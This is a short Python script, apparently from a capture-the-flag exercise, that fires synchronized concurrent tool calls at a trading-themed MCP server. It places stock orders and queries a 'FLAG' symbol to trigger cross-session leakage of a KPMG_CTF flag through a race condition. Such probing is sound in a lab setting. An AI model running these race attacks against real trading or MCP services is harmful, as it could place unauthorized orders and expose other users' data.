#!/usr/bin/env python3
"""Fire mixed concurrent requests; detect cross-order contamination or flag leakage."""
import json, threading, time, sys, re
from mcpclient import MCP, extract

FLAG_RE = re.compile(r"KPMG[_A-Za-z0-9{}]*|KPMG_CTF\{[^}]*\}", re.I)

def make(n):
    return [MCP() for _ in range(n)]

def burst(plan, rounds=8):
    """plan: list of (tool, args). Creates one session per request, fires all at once."""
    findings = []
    for r in range(rounds):
        n = len(plan)
        sess = make(n)
        barrier = threading.Barrier(n + 1)
        outs = [None]*n
        def worker(i):
            barrier.wait()
            try:
                outs[i] = extract(sess[i].tool(plan[i][0], plan[i][1], timeout=60))
            except Exception as e:
                outs[i] = "EXC "+str(e)
        ths = [threading.Thread(target=worker, args=(i,)) for i in range(n)]
        for t in ths: t.start()
        time.sleep(0.4)
        barrier.wait()
        for t in ths: t.join()
        for (tool, args), o in zip(plan, outs):
            if o and FLAG_RE.search(o):
                findings.append((tool, args, o))
                print("!!! FLAG LEAK:", tool, args, o)
        # print outputs of legit orders for inspection
        for (tool, args), o in zip(plan, outs):
            if tool == "place_order":
                print("  [%d] %s -> %s" % (r, args.get("symbol"), (o or "")[:150]))
    return findings

if __name__ == "__main__":
    plan = [
        ("place_order", {"symbol":"AAPL","quantity":1,"order_type":"buy"}),
        ("place_order", {"symbol":"MSFT","quantity":1,"order_type":"buy"}),
        ("place_order", {"symbol":"GOOGL","quantity":1,"order_type":"buy"}),
        ("place_order", {"symbol":"TSLA","quantity":1,"order_type":"buy"}),
        ("place_order", {"symbol":"FLAG","quantity":1,"order_type":"buy"}),
        ("place_order", {"symbol":"FLAG","quantity":1,"order_type":"sell"}),
        ("get_stock_price", {"symbol":"FLAG"}),
        ("get_stock_info", {"symbol":"FLAG"}),
        ("get_risk_report", {}),
    ]
    f = burst(plan, rounds=8)
    print("findings:", len(f))
